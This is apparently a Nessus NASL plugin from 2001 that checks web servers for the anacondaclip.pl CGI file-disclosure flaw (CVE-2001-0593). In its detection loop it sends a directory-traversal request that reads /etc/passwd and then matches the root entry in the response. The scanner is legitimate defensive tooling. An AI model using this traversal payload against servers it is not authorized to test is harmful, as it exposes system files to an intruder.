#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10644);
 script_bugtraq_id(2512);
 script_cve_id("CVE-2001-0593");
 script_version ("$Revision: 1.19 $");
 name["english"] = "anacondaclip CGI vulnerability";
 name["francais"] = "anacondaclip";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The CGI script 'anacondaclip', which
comes with anacondaclip.pl, is installed on this machine. This CGI has
a well known security flaw that allows an attacker to read arbitrary
files on the remote system with the privileges of the HTTP daemon (usually 
root or nobody).

Solution : Remove the 'anacondaclip' script from your web server's CGI 
directory (typically cgi-bin/).

Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of anacondaclip.pl";
 summary["francais"] = "Vérifie la présence de anacondaclip.pl";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
req = http_get(item:string(dir, "/anacondaclip.pl?template=../../../../../../../../../../../../../../../etc/passwd"),
  		 port:port);
buf = http_keepalive_send_recv(port:port, data:req);
if(buf == NULL)exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf)){
	security_hole(port);
	exit(0);
	}
}
